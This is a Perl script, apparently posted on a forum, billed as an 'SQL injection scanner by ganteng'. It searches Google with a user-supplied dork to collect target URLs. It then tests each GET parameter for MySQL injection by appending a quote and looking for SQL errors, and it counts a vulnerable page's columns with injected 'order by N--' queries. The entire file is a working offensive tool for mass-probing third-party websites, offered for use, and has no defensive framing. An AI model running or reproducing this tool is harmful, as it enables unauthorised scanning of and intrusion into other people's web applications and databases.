PHP Code:
#!/usr/bin/perl -w

use strict;
use LWP::UserAgent;
use Google::Search;
use utf8;
use Getopt::Long;

use constant DEBUG => 1;

my $__Version__ = 1.0;


############ Globals #################
$| = 1;

my ($ua, $url);
my ($scheme, $host, $path, $query, $fragment) = ('', '', '', '', ''); #URL parts
my (@vars, @vals); # The splited query


my $sqlError = "((?=.*sql)(?=.*syntax))|".
"((?=.*sql)(?=.*error)) |".
"(mysql)";
my $fieldError = "Unknown column|SQL";


############### Basic functions #################
sub createLWP
{
$ua = LWP::UserAgent->new;
$ua->agent('Linux Mozilla');
}

sub parseUrl
{
($scheme, $host, $path, $query, $fragment) =
$url =~ m|^(?[^:/?#]+)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|;

return if(not defined $query or $query eq ''); # If there is no query

@vars = ();
@vals = ();

foreach my $pair (split /&/, $query)
{
my ($var,$value) = split /=/, $pair;

push @vars, $var;
push @vals, $value;
}
}

sub fetchHTML
{
my $pageURL = shift;
my $res;

$res = $ua->get($pageURL);

#print $res->status_line," " unless ($res->is_success);

return $res->content; # The HTML

}
############# Basic sqli functions #########################
sub checkVuln
{
my $checkURL;
my $html;

return "no" if(not defined $query or $query eq '');

# Check if already contains the sql string
$checkURL = $scheme."://".$host.$path;
$html = fetchHTML($checkURL);

if($html =~ m/$sqlError/i)
{
return "Contains the SQL string by default.";
}

for(my $i=0; $i<@vars; ++$i)
{
$checkURL = $scheme."://".$host.$path."?";

for(my $j=0;$j<@vars;++$j)
{
if($j==$i)
{
$checkURL .= $vars[$j]."=1'";
}
else
{
$checkURL .= $vars[$j]."=".$vals[$j];
}

$checkURL .= "&" if($j<@vals-1);
}

$html = fetchHTML($checkURL);

if($html =~ m/Microsoft/i)
{
return "MSSQL (only MYSQL supported)";
}
if($html =~ m/$sqlError/i)
{
return "yes";
}
}

return "no";
}

sub getNumOfFields
{
my $maxNum = shift;

my $checkURL = $url;

my ($lastVar, $lastVal) = ($vars[$#vars], $vals[$#vals]);
$checkURL =~ s/$lastVar=$lastVal/$lastVar=1 order by /;

my $i;
for($i=1; $i<=$maxNum; $i+=10)
{
my $html = fetchHTML($checkURL.$i."--");

if($html =~ m/$fieldError/i)
{
last;
}
}

for($i=$i; $i>0; --$i)
{
my $html = fetchHTML($checkURL.$i."--");

if($html !~ m/$fieldError/i)
{
return $i;
}
}

return 0;
}

########### Full sqli proccess ########################

sub fullCrack
{
print "Determining site vulnerability... ";

my $vuln = checkVuln;

print "[".$vuln."]\n";

return if($vuln ne 'yes');

print "Enter the max number of fields: ";
my $maxFields = <STDIN>;
chomp $maxFields;

print "Determining number of fields... ";

my $numOfFields = getNumOfFields($maxFields);

if($numOfFields == 0)
{
print "failed!\nTry a bigger number or I just can't get it.\n";
}
else
{
print "[".$numOfFields."]\n";
}
}

################ Print functions ############

sub printBar
{
print "*====================================*\n";
print "|  SQL injection scanner by ganteng  |\n";
print "*====================================*\n";
}
sub printMenu
{
print "--------------\n";
print "1: Scan sites\n";
print "2: Scan specific url\n";
print "3: Manual\n";
print "4: exit\n";
print "Command: ";
}

################## Functions from menu #################

sub manual
{
print "-------\n";
print "|Manual|\n";
print "-------\n";
print "General things:\n";
print "The script supports Mysql databases only.\n";
print "Scan sites:\n";
print "\tAsks for a dork, and number of results,\n";
print "\tand searchs in google for valnurable sites\n\t(Tests every parameter)\n";
print "Scan specific url:\n";
print "\tDo a valnurability scan to the url and more.\n";
print "\t(Uses only the last GET parameter)\n";
}
sub scanSpecific
{
print "URL: ";

$url = <STDIN>;
chomp $url;

if($url !~ /(?=.*http)(?=.*www)/)
{
print "Url must be absolute\n";
}
else
{
parseUrl;
fullCrack;
}
}

sub scanSites
{
my $dork;
my $maxPage = 10;

print "Dork: ";

$dork = <STDIN>;
chomp $dork;

print "Maximum result: ";
$maxPage = <STDIN>;
chomp $maxPage;

my $search = Google::Search->Web( query => "inurl:".$dork );

my $i=0;
while ( my $result = $search->next and $i<$maxPage)
{
if($result->uri ne '')
{
$url = $result->uri->as_string;
print $url."...\t";

parseUrl;

print "[".checkVuln."]\n";
}
++$i;
}
print $search->error->reason, "\n" if $search->error;
}

########################################


# The main function
sub main
{
printBar;

createLWP;

my $exit = 0;
while(not $exit)
{
printMenu;

my $cmd = <STDIN>;
chomp $cmd;

if($cmd =~ /1/)
{
scanSites;
}
elsif($cmd =~ /2/)
{
scanSpecific;
}
elsif($cmd =~ /3/)
{
manual;
}
elsif($cmd =~ /4/)
{
$exit = 1;
}
}

print "Bye!\n";
}

# Call the main function
main;
